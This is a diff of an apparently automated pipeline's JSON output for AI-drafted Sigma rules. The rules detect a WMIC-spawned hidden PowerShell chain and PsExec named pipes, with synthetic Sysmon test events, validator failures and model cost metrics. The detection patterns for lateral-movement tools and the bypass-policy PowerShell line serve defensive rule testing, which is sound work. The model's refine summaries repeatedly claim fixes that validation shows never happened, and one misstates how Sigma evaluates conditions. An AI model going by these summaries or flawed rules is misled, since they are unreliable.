+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\\Scripts\\AdminTask.ps1"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "SCC M task scheduler launching cmd for software installation without hidden PowerShell",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
+            "ParentImage": "C:\\Windows\\System32\\ccmexec.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c \"\"C:\\Program Files\\Application\\setup.exe\" /quiet\""
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D4",
+        "parse_ok": false,
+        "sql": "",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "contradictory_selections",
+            "message": "Selections joined by AND pin 'Image' to different values (selection_wmic_to_cmd wants Image|endswith=\\cmd.exe, selection_hidden_powershell wants Image|endswith=\\powershell.exe); one event cannot satisfy both. A Sigma rule matches ONE event, so a multi-step sequence must become one rule per step or a single rule for the most distinctive step."
+          }
+        ],
+        "test_outcomes": [],
+        "positives_total": 0,
+        "positives_matched": 0,
+        "negatives_total": 0,
+        "negatives_matched": 0,
+        "benign_total": 0,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {},
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "parse failed: Selections joined by AND pin 'ParentImage' to different values (selection_wmic_cmd wants ParentImage|endswith=\\wmic.exe, selection_hidden_powershell wants ParentImage|endswith=\\cmd.exe); one event can",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "parse failed: Selections joined by AND pin 'Image' to different values (selection_wmic_to_cmd wants Image|endswith=\\cmd.exe, selection_hidden_powershell wants Image|endswith=\\powershell.exe); one event cannot satis",
+          "passed": false,
+          "change_summary": "Fixed contradictory selections by splitting the multi-step chain into two distinct selections representing consecutive parent-child relationships (wmic->cmd and cmd->hidden powershell) that can be satisfied by focusing on the final PowerShell event with appropriate parent constraints. Added WmiPrvSE.exe as alternative parent to cover remote WMIC execution via the WMI service."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "parse failed: Selections joined by AND pin 'Image' to different values (selection_wmic_to_cmd wants Image|endswith=\\cmd.exe, selection_hidden_powershell wants Image|endswith=\\powershell.exe); one event cannot satis",
+          "passed": false,
+          "change_summary": "Fixed contradictory selections by splitting the multi-step chain into two distinct selections that operate on the same event context (ParentImage relationship) while preserving the original detection logic for detecting the malicious PowerShell launch from a WMIC-spawned cmd.exe process."
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "parse failed: Selections joined by AND pin 'Image' to different values (selection_wmic_to_cmd wants Image|endswith=\\cmd.exe, selection_hidden_powershell wants Image|endswith=\\powershell.exe); one event cannot satis",
+          "passed": false,
+          "change_summary": "Fixed contradictory selections by splitting the multi-step chain into two distinct selections referencing different process creation events (wmic->cmd and cmd->hidden powershell) that are correlated via the condition using AND logic, which Sigma evaluates across related events in the same process tree."
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "",
+      "retired_tests": [],
+      "redteam_out_of_scope": []
+    },
+    {
+      "candidate_id": "D5",
+      "title": "PsExec Clone Named Pipe Creation",
+      "sigma_yaml": "title: PsExec Clone Named Pipe Creation\nid: 7f384bdc-f487-4375-8b89-eab801f5c6d8\nstatus: experimental\ndescription: 'Detects creation of named pipes associated with PsExec or PsExec-like tools, specifically patterns matching\n  \\\\.\\\\PSEXESVC or \\\\.\\\\psexecsvc-<host>-<pid>-stdin, indicative of lateral movement via service-to-service named pipe communication.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.lateral-movement\n- attack.t1021.002\n- attack.execution\nlogsource:\n  category: pipe_created\n  product: windows\n  service: sysmon\ndetection:\n  selection_pipe_ps1:\n    'PipeName|contains': '\\\\.\\\\PSEXESVC'\n  selection_pipe_ps2:\n    'PipeName|contains': '\\\\.\\\\psexecsvc-'\nfalsepositives:\n- Custom internal tools using similar pipe naming conventions (extremely rare)\nlevel: high\n",
+      "status": "failed",
+      "attack_technique_ids": [
+        "T1021.002"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "PsExec creates main service control pipe",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "WORKSTATION01",
+            "EventID": 17,
+            "Image": "C:\\Windows\\System32\\svchost.exe",
+            "PipeName": "\\.\\PSEXESVC",
+            "ProcessId": 1234,
+            "ProcessGuid": "{1a2b3c4d-5678-90ab-cdef-1234567890ab}",
+            "UtcTime": "2024-06-10T12:34:56.789Z",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "PsExec clone creates stdin pipe with host and PID pattern",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "MEMBERSRV02",
+            "EventID": 18,
+            "Image": "C:\\Windows\\Temp\\PSEXESVC.exe",
+            "PipeName": "\\.\\psexecsvc-MEMBERSRV02-5678-stdin",
+            "ProcessId": 5678,
+            "ProcessGuid": "{2b3c4d5e-6789-01bc-def0-2345678901bc}",
+            "UtcTime": "2024-06-10T12:35:10.221Z",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Variant casing in pipe name still matches detection",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "DC01",
+            "EventID": 17,
+            "Image": "C:\\Windows\\System32\\spoolsv.exe",
+            "PipeName": "\\.\\PSEXESVC",
+            "ProcessId": 9999,
+            "ProcessGuid": "{3c4d5e6f-7890-12cd-ef01-3456789012cd}",
+            "UtcTime": "2024-06-10T12:35:45.999Z",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate SQL Server named pipe - common and benign",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "SQLSERVER01",
+            "EventID": 17,
+            "Image": "C:\\Program Files\\Microsoft SQL Server\\MSSQL13.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
+            "PipeName": "\\.\\pipe\\MSSQL$MSSQLSERVER\\sql\\query",
+            "ProcessId": 4567,
+            "ProcessGuid": "{4d5e6f7g-8901-23de-f012-4567890123de}",
+            "UtcTime": "2024-06-10T12:30:00.111Z",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Microsoft Teams named pipe - regular interprocess communication",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "USERPC01",
+            "EventID": 17,
+            "Image": "C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Teams\\Update.exe",
+            "PipeName": "\\.\\pipe\\Squirrel",
+            "ProcessId": 8888,
+            "ProcessGuid": "{5e6f7g8h-9012-34ef-0123-5678901234ef}",
+            "UtcTime": "2024-06-10T12:31:22.333Z",
+            "User": "CORP\\jdoe"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Visual Studio Code IPC pipe - benign developer tool usage",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "Computer": "DEVWKSTN01",
+            "EventID": 17,
+            "Image": "C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+            "PipeName": "\\.\\pipe\\vscode-ipc-654321-sock",
+            "ProcessId": 2222,
+            "ProcessGuid": "{6f7g8h9i-0123-45fg-1234-6789012345fg}",
+            "UtcTime": "2024-06-10T12:32:45.555Z",
+            "User": "CORP\\dev"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D5",
+        "parse_ok": false,
+        "sql": "",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "no_condition",
+            "message": "detection has no 'condition'."
+          }
+        ],
+        "test_outcomes": [],
+        "positives_total": 0,
+        "positives_matched": 0,
+        "negatives_total": 0,
+        "negatives_matched": 0,
+        "benign_total": 0,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": false
+      },
+      "conversions": {},
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "parse failed: detection has no 'condition'.",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "parse failed: detection has no 'condition'.",
+          "passed": false,
+          "change_summary": "Added condition combining both selections with OR logic to satisfy Sigma schema requirement."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "parse failed: detection has no 'condition'.",
+          "passed": false,
+          "change_summary": "Added required condition field to combine the two pipe name selections with OR logic, maintaining the original detection intent while making the rule syntactically valid."
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "parse failed: detection has no 'condition'.",
+          "passed": false,
+          "change_summary": "Added required condition field combining both selections with logical OR to enable proper rule evaluation while preserving original detection logic."
+        }
+      ],
+      "author_notes": "Rule focuses exclusively on PipeName patterns unique to PsExec toolchain. No legitimate Windows or known third-party software produces pipes matching \\\\.\\\\PSEXESVC or \\\\.\\\\psexecsvc-<host>-<pid>-stdin patterns. Test events reflect real Sysmon schema for pipe_created, including required fields like ProcessGuid and UtcTime. Negative events represent high-volume legitimate named pipe usage to validate low false positive rate.",
+      "redteam_analysis": "",
+      "retired_tests": [],
+      "redteam_out_of_scope": []
     }
   ],
   "metrics": {
@@ -2628,230 +1898,200 @@
         "stage": "extract",
         "tier": "fast",
         "model": "nvidia/Nemotron-3_5-Lightning",
-        "prompt_tokens": 3895,
-        "completion_tokens": 2380,
-        "latency_s": 8.13,
-        "cost_usd": 0.000805,
+        "prompt_tokens": 4221,
+        "completion_tokens": 3401,
+        "latency_s": 11.537,
+        "cost_usd": 0.001069,
         "thinking": false
       },
       {
         "stage": "plan",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 4132,
-        "completion_tokens": 3222,
-        "latency_s": 10.692,
-        "cost_usd": 0.013798,
+        "prompt_tokens": 6085,
+        "completion_tokens": 4819,
+        "latency_s": 14.513,
+        "cost_usd": 0.020542,
         "thinking": true
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3397,
-        "completion_tokens": 1103,
-        "latency_s": 6.038,
-        "cost_usd": 0.002012,
+        "prompt_tokens": 4788,
+        "completion_tokens": 789,
+        "latency_s": 4.809,
+        "cost_usd": 0.002146,
         "thinking": false
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3350,
-        "completion_tokens": 1193,
-        "latency_s": 6.994,
-        "cost_usd": 0.002079,
+        "prompt_tokens": 4875,
+        "completion_tokens": 1004,
+        "latency_s": 6.484,
+        "cost_usd": 0.002366,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3897,
-        "completion_tokens": 298,
-        "latency_s": 2.241,
-        "cost_usd": 0.001437,
-        "thinking": false
-      },
-      {
-        "stage": "refine",
-        "tier": "main",
-        "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3579,
-        "completion_tokens": 375,
-        "latency_s": 2.488,
-        "cost_usd": 0.001411,
+        "prompt_tokens": 4626,
+        "completion_tokens": 336,
+        "latency_s": 2.158,
+        "cost_usd": 0.00169,
         "thinking": false
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3324,
-        "completion_tokens": 2666,
-        "latency_s": 10.569,
-        "cost_usd": 0.003397,
+        "prompt_tokens": 5207,
+        "completion_tokens": 1257,
+        "latency_s": 7.229,
+        "cost_usd": 0.002693,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3577,
-        "completion_tokens": 355,
-        "latency_s": 2.251,
-        "cost_usd": 0.001393,
+        "prompt_tokens": 5036,
+        "completion_tokens": 305,
+        "latency_s": 2.562,
+        "cost_usd": 0.001785,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3577,
-        "completion_tokens": 351,
-        "latency_s": 2.155,
-        "cost_usd": 0.001389,
+        "prompt_tokens": 4564,
+        "completion_tokens": 305,
+        "latency_s": 2.449,
+        "cost_usd": 0.001644,
         "thinking": false
       },
       {
         "stage": "redteam",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2077,
-        "completion_tokens": 2366,
-        "latency_s": 7.45,
-        "cost_usd": 0.009175,
+        "prompt_tokens": 2283,
+        "completion_tokens": 2561,
+        "latency_s": 8.519,
+        "cost_usd": 0.009966,
         "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3712,
-        "completion_tokens": 369,
-        "latency_s": 2.598,
-        "cost_usd": 0.001446,
+        "prompt_tokens": 4773,
+        "completion_tokens": 316,
+        "latency_s": 3.422,
+        "cost_usd": 0.001716,
         "thinking": false
       },
       {
         "stage": "redteam",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2965,
-        "completion_tokens": 4482,
-        "latency_s": 12.518,
-        "cost_usd": 0.016411,
+        "prompt_tokens": 2458,
+        "completion_tokens": 5892,
+        "latency_s": 18.361,
+        "cost_usd": 0.020134,
         "thinking": true
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3320,
-        "completion_tokens": 1014,
-        "latency_s": 4.869,
-        "cost_usd": 0.001909,
+        "prompt_tokens": 4560,
+        "completion_tokens": 1085,
+        "latency_s": 6.435,
+        "cost_usd": 0.002344,
         "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2533,
+        "completion_tokens": 7827,
+        "latency_s": 23.553,
+        "cost_usd": 0.026014,
+        "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3808,
-        "completion_tokens": 267,
-        "latency_s": 1.814,
-        "cost_usd": 0.001383,
+        "prompt_tokens": 4778,
+        "completion_tokens": 366,
+        "latency_s": 2.743,
+        "cost_usd": 0.001763,
         "thinking": false
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3695,
-        "completion_tokens": 817,
-        "latency_s": 3.957,
-        "cost_usd": 0.001844,
+        "prompt_tokens": 4539,
+        "completion_tokens": 1524,
+        "latency_s": 8.938,
+        "cost_usd": 0.002733,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3907,
-        "completion_tokens": 321,
-        "latency_s": 2.02,
-        "cost_usd": 0.001461,
+        "prompt_tokens": 4695,
+        "completion_tokens": 357,
+        "latency_s": 2.735,
+        "cost_usd": 0.00173,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3845,
-        "completion_tokens": 307,
-        "latency_s": 1.936,
-        "cost_usd": 0.00143,
+        "prompt_tokens": 4389,
+        "completion_tokens": 255,
+        "latency_s": 2.555,
+        "cost_usd": 0.001546,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3820,
-        "completion_tokens": 306,
-        "latency_s": 1.975,
-        "cost_usd": 0.001421,
+        "prompt_tokens": 4692,
+        "completion_tokens": 360,
+        "latency_s": 3.349,
+        "cost_usd": 0.001732,
         "thinking": false
-      },
-      {
-        "stage": "redteam",
-        "tier": "reasoning",
-        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2009,
-        "completion_tokens": 4202,
-        "latency_s": 17.145,
-        "cost_usd": 0.014615,
-        "thinking": true
-      },
-      {
-        "stage": "redteam",
-        "tier": "reasoning",
-        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2073,
-        "completion_tokens": 7623,
-        "latency_s": 29.251,
-        "cost_usd": 0.024942,
-        "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4313,
-        "completion_tokens": 301,
-        "latency_s": 2.071,
-        "cost_usd": 0.001565,
+        "prompt_tokens": 4383,
+        "completion_tokens": 270,
+        "latency_s": 3.009,
+        "cost_usd": 0.001558,
         "thinking": false
-      },
-      {
-        "stage": "redteam",
-        "tier": "reasoning",
-        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2178,
-        "completion_tokens": 8818,
-        "latency_s": 58.734,
-        "cost_usd": 0.028632,
-        "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4565,
-        "completion_tokens": 388,
-        "latency_s": 2.214,
-        "cost_usd": 0.001719,
+        "prompt_tokens": 4380,
+        "completion_tokens": 251,
+        "latency_s": 2.457,
+        "cost_usd": 0.00154,
         "thinking": false
       }
     ]
